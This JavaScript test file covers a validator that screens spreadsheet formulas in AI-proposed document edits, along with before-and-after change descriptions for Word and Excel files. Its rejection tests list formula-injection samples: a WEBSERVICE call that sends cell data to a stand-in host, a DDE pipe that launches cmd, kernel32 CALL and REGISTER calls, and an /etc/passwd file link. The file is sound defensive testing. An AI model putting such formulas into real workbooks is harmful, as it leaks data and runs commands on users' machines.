import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createDocx, createXlsx, setXlsxCells } from 'ooxml-core/automation';
import { describeChanges, formulaProblem, validateChanges } from './ai-operations.js';

const xlsxDoc = { id: 'd1', kind: 'xlsx', name: 'budget.xlsx', revision: 1 };
const docxDoc = { id: 'd2', kind: 'docx', name: 'letter.docx', revision: 1 };
const cellChange = (input) => ({
	documentId: 'd1',
	type: 'cells',
	sheetIndex: 0,
	cells: [{ address: 'B2', input }],
});

test('formulaProblem allows ordinary formulas, structured references and plain text', () => {
	for (const input of [
		'=SUM(A1:A3)',
		'=IF(A1>0,"ok",B1)',
		'=_xlfn.XLOOKUP(A1,B:B,C:C)',
		'=Table1[Amount]',
		'=[@Amount]*2',
		'=MYIMAGE(A1)',
		'=A1&"image"',
		'plain text with IMAGE( and | pipes',
		'42',
	])
		assert.equal(formulaProblem(input), null, input);
});

test('formulaProblem rejects network, code and link functions in any case or prefix', () => {
	for (const input of [
		'=WEBSERVICE("https://example.test/?d="&A1)',
		'=webservice (A1)',
		'=_xlfn.WEBSERVICE(A1)',
		'=_xlws.FILTERXML(A1,"//x")',
		'=filterxml(A1,"//x")',
		'=HYPERLINK("x","y")',
		'=IMAGE("u")',
		'=+RTD("prog","","topic")',
		'=CALL("kernel32","GetTickCount","J")',
		'=REGISTER.ID("kernel32","GetTickCount","J")',
		'=REGISTER("a","b")',
	])
		assert.match(formulaProblem(input) ?? '', /function/, input);
});

test('formulaProblem rejects DDE pipes, external workbooks, links and paths', () => {
	assert.match(formulaProblem("=cmd|' /C calc'!A1") ?? '', /DDE/);
	assert.match(formulaProblem('=[1]Sheet1!A1') ?? '', /external workbook/);
	assert.match(formulaProblem('=[budget.xlsx]Sheet1!A1') ?? '', /external workbook/);
	assert.match(formulaProblem("=SUM('C:\\data\\[x.xlsx]S'!A1)") ?? '', /link or a file path/);
	assert.match(formulaProblem('=\\\\server\\share\\x') ?? '', /link or a file path/);
	assert.match(formulaProblem('="http://example.test"') ?? '', /link or a file path/);
	assert.match(formulaProblem('=file:///etc/passwd') ?? '', /link or a file path/);
});

test('validateChanges rejects an unsafe formula and names the cell', () => {
	assert.throws(
		() => validateChanges([cellChange('=WEBSERVICE("https://x.test")')], [xlsxDoc]),
		/formula in B2 was rejected/,
	);
});

test('validateChanges accepts an ordinary formula and plain values', () => {
	assert.doesNotThrow(() => validateChanges([cellChange('=SUM(A1:A3)')], [xlsxDoc]));
	assert.doesNotThrow(() => validateChanges([cellChange('12.5')], [xlsxDoc]));
});

test('describeChanges shows the current and proposed value of a Word run', async () => {
	const bytes = await createDocx(['Hello world']);
	const rows = await describeChanges(
		[{ documentId: 'd2', type: 'word_run', paragraphId: 'p0', runIndex: 0, text: 'Goodbye' }],
		[{ ...docxDoc, bytes }],
	);
	assert.deepEqual(rows, [
		{
			file: 'letter.docx',
			target: 'Paragraph p0, run 1',
			before: 'Hello world',
			after: 'Goodbye',
		},
	]);
});

test('describeChanges shows the current value and formula of a worksheet cell', async () => {
	const base = await createXlsx(['Budget']);
	const bytes = (
		await setXlsxCells(base, 0, [
			{ address: 'A1', input: '5' },
			{ address: 'B2', input: '=A1*2' },
		])
	).bytes;
	const rows = await describeChanges(
		[cellChange('=SUM(A1:A3)'), { ...cellChange('7'), cells: [{ address: 'A1', input: '7' }] }],
		[{ ...xlsxDoc, bytes }],
	);
	assert.equal(rows[0].file, 'budget.xlsx');
	assert.equal(rows[0].target, 'Sheet 1, cell B2');
	assert.equal(rows[0].before, '=A1*2');
	assert.equal(rows[0].after, '=SUM(A1:A3)');
	assert.equal(rows[1].before, '5');
	assert.equal(rows[1].after, '7');
});
